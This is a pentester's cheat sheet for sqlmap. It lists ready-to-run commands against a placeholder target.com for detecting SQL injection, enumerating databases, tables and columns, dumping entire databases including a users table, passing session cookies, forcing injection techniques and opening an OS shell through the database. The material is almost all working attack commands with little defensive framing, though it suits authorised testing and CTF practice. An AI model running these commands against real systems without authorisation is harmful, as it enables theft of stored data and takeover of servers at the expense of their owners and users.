# 📌 Sqlmap Cheat Sheet for Pentesters

Sqlmap is an open-source penetration testing tool that automates the detection and exploitation of SQL injection flaws.

---

## 🔧 Basic Usage

```shell
sqlmap -u "http://target.com/page.php?id=1" --batch
```

- `-u`: Target URL
- `--batch`: Non-interactive mode (default answers)

---

## 📄 Using a Request File (Burp Suite)

```shell
sqlmap -r request.txt --batch
```

- `-r`: Use an HTTP request file captured via Burp Suite.

---

## 📚 DB Enumeration

### Current User

```shell
sqlmap -u "http://target.com/page.php?id=1" --current-user --batch
```

### Current Database

```shell
sqlmap -u "http://target.com/page.php?id=1" --current-db --batch
```

### List All Databases

```shell
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch
```

---

## 📂 Table & Column Enumeration

### List Tables in a Database

```shell
sqlmap -u "http://target.com/page.php?id=1" -D target_db --tables --batch
```

### List Columns in a Table

```shell
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users --columns --batch
```

---

## 🧪 Dumping Data

### Dump All from a Table

```shell
sqlmap -u "http://target.com/page.php?id=1" -D target_db -T users --dump --batch
```

### Dump Everything

```shell
sqlmap -u "http://target.com/page.php?id=1" --dump-all --batch
```

---

## 🧠 Advanced Options

### Check if Current User is DBA

```shell
sqlmap -u "http://target.com/page.php?id=1" --is-dba --batch
```

### Search for a Specific Column (e.g., flag)

```shell
sqlmap -u "http://target.com/page.php?id=1" --search -C flag --batch
```

---

## 🧰 DBMS-Specific Examples

### MySQL

```shell
sqlmap -u "http://target.com/page.php?id=1" --dbms=MySQL --batch --dump
```

### PostgreSQL

```shell
sqlmap -u "http://target.com/page.php?id=1" --dbms=PostgreSQL --batch --dump
```

### Microsoft SQL Server

```shell
sqlmap -u "http://target.com/page.php?id=1" --dbms="Microsoft SQL Server" --batch --dump
```

### Oracle

```shell
sqlmap -u "http://target.com/page.php?id=1" --dbms=Oracle --batch --dump
```

---

## 🖥️ OS Command Execution (if supported)

```shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell --batch
```

> Note: Only works if stacked queries or certain DBMS functions (e.g., `xp_cmdshell`) are available.

---

## 🔐 Authentication Options

```shell
sqlmap -u "http://target.com/page.php?id=1" --cookie="SESSIONID=abc123" --batch
```

---

## 🛠️ Technique Forcing

```shell
sqlmap -u "http://target.com/page.php?id=1" --technique=BEUSTQ --batch
```

- B: Boolean-based blind
- E: Error-based
- U: UNION-based
- S: Stacked queries
- T: Time-based
- Q: Inline queries

---

## 💡 Tips

- Use `--flush-session` to clear cached data if you're modifying parameters.
- Use `--risk=3 --level=5` for deeper tests (but more requests).
- Use `--threads=10` to speed up scans (if the server can handle it).

---

## 📌 Example: Oracle with Burp Request File

```shell
sqlmap -r burp_sqlmap-oracle.txt --dbms=Oracle --current-user --tables --batch
sqlmap -r burp_sqlmap-oracle.txt -D APP_USER -T flags --dump --batch
```

---

## 📎 Resources

- [sqlmap.org](http://sqlmap.org)
- `sqlmap --help` (for full CLI reference)